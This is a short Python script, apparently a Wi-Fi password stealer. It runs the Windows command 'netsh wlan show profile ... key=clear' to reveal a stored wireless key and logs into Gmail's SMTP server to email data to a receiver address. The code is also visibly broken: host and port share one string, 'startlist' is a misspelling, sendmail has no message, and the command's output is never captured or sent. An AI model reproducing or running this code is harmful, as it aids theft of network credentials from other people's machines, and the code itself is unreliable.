import subprocess, smtplib

sender_mail = 'sender mail'
password = 'password'
receiver_mail = 'receiver mail'

s = smtplib.SMTP('smtp.gmail.com, 587')
s.startlist()
s.login(sender_mail,password)
s.sendmail(sender_mail,receiver_mail)
s.quit()

command = "netsh wlan show profile wifi_name key=clear"
subprocess.run(command,shell=True)